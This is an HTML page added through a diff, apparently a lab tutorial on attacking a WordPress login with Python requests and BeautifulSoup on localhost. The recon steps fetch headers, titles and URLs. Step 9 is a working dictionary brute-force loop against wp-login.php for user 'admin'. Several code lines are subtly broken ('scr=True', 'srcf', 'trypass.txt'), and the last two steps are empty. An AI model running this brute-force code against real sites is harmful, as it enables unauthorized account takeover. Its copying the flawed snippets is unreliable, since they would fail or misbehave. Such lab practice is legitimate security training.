@@ -1,0 +1,163 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Attacking Web Forms with requests and BeautifulSoup in Python</title>
+</head><body>Learn how to work with requests and beautifulsoup4 modules and Python to conduct web attacks. We're going to be using the lab on Attack Defense labs which is a platform to exercise and grow your penetration testing and cybersecurity skills.<br/>
+Now here we're dealing with a web portal and we need to do some initial recon and then actually brute force authentication all using Python.<br/>
+There is everything installed for us in the lab and we will be using Jupiter notebooks.<br/>
+<br/>
+Now to get a very similar scenario to the one that I have here, you could have you could install a virtual machine in VM or virtual box and then install a vulnerable CMS(Content Management Systems) like wordpress, drupal, joomla! etc on the machine like the one we're attacking in this scenario.<br/>
+And that's all for free.<br/>
+Or like I'm doing in this case you could get a subscription on attack defense whichever you find the best suitable for you.<br/>
+Now I'm using a tag defense labs platform for convenience here for no setup and for your better understanding.<br/>
+<br/>
+Requirements :-<br/>
+* pip install requests<br/>
+* pip install beautifulsoup4 ( Used to pull data out from html or xml files.)<br/>
+* CMS running on port 80 or any.<br/>
+* Password Dictionary file<br/>
+<br/>
+Attacking Web Portals - <br/>
+A CMS is hosted on port 80 or any port and we are gonna install above requirements and run commands on jupyter notebook<br/>
+<br/>
+Step1 - Check if webportal is up by using GET request.<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">import requests as r</li>
+<li style="list-style-type: none">r.get("http://127.0.0.1")</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Response [200]</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step2 - Print response headers of GET response and find which server is software being used?<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">req = r.get("http://127.0.0.1")</li>
+<li style="list-style-type: none">req.headers</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Server : ngnix/1.14.0</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step3 - Get text content of localhost homepage and also find which CMS is running on local host.<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">req.content ( or req.text ) </li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - An html code of the localhost homepage appears. In title section, find the CMS running like wordpress.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step4 - Print the response in a pretty form using beautifulsoup4<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">from bs4 import BeautifulSoup as bs</li>
+<li style="list-style-type: none">soup = bs(req.content, "html.parser")</li>
+<li style="list-style-type: none">#if above one doesnt work, try req.text</li>
+<li style="list-style-type: none">print(soup.prettify())</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Same html code but pretty</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step5 - Print the title of the web portal hosted on localhost<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">print(soup.title)</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Title WordPress</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step6 - Print the URLs present on homepage<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">homepage = r.get("http://127.0.0.1")</li>
+<li style="list-style-type: none">soup = bs(homepage.content, "html.parser")</li>
+<li style="list-style-type: none">imgs = soup.find_all("img", scr=True) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# all images ("img") tags are collected. &lt;img src="smt"&gt;</li>
+<li style="list-style-type: none">imgs_src = []</li>
+<li style="list-style-type: none">for img in imgs:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">imgs_src.append(img['srcf'])</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+imgs_set = set(imgs_src) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# to get unique elements, set() is used.<br/>
+for img in imgs_set:<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">print(img)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">Ouput - Prints urls of all the images.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step7 - Scrape all URLs from homepage and print unique URLs.<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">homepage = r.get("http://127.0.0.1")</li>
+<li style="list-style-type: none">soup = bs(homepage.content, "html.parser")</li>
+<li style="list-style-type: none">urls = soup.find_all("a", href=True) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# all anchor ("a") tags are collected. &lt;a href="smt"&gt;</li>
+<li style="list-style-type: none">urls_href = []</li>
+<li style="list-style-type: none">for url in urls:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">urls_href.append(url['href'])</li>
+</ul>
+</li>
+<li style="list-style-type: none">urls_set = set(urls_href) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# to get unique elements, set() is used.</li>
+<li style="list-style-type: none">for url in urls_set:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">print(url)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Prints all urls present on homepage.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step8 - Can you access the admin (/wp-admin/) of the CMS? (wordpress here)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">admin = r.get("http://127.0.0.1/wp-admin/")</li>
+<li style="list-style-type: none">soup_admin = bs(admin.content, "html.parser")</li>
+<li style="list-style-type: none">print(soup_admin.prettify())</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - prints content of admin page in a pretty way.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Attack steps -<br/>
+Step 9 - Bruteforce the wordpress login with user "admin" using password file.<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">passfile = "password.txt"</li>
+<li style="list-style-type: none">with open(passfile, "r") as f:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">for word in f:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">word = word.strip("\n")</li>
+<li style="list-style-type: none">trypass = r.post("http://127.0.0.1/wp-login.php", data={ "log":"admin", "pwd":word}) &nbsp;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul><ul><ul><ul># here log and pwd were used as input "name" for userid and</ul>
+</ul>
+</ul>
+</ul>
+&nbsp;password<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">if "ERROR" not in trypass.txt:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">print("Success, pwd is", word)</li>
+<li style="list-style-type: none">break</li>
+</ul>
+</li>
+<li style="list-style-type: none">else:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">print("wrong pwd", word)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">Output - Print correct and wrong password for name admin.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Step 10 - A token is kept at page localhost/token/index.html by user "anon" but the page is protected. what kind of protection is deployed?<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+</li>
+</ul>
+Step11 - Break the protection and get token.<ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<span style="font-size: 12pt"><b>Platforms/Web Apps to practice skills:</b></span><br/>
+&nbsp;<br/>
+<a href="http://hackthebox.eu/"><span style="font-size: 12pt">http://hackthebox.eu</span></a><br/>
+&nbsp;<br/>
+<a href="http://tryhackme.com/"><span style="font-size: 12pt">http://tryhackme.com/</span></a><br/>
+&nbsp;<br/>
+<a href="https://www.root-me.org/?lang=en"><span style="font-size: 12pt">https://www.root-me.org/?lang=en</span></a><br/>
+&nbsp;<br/>
+<a href="https://information.rapid7.com/metasploit-framework.html"><span style="font-size: 12pt">https://information.rapid7.com/metasploit-framework.html</span></a><br/>
+&nbsp;<br/>
+<a href="http://www.dvwa.co.uk/"><span style="font-size: 12pt">http://www.dvwa.co.uk/</span></a><br/>
+&nbsp;<br/>
+<a href="http://attackdefense.com/"><span style="font-size: 12pt">http://attackdefense.com/</span></a><br/>
+&nbsp; &nbsp; </body></html>
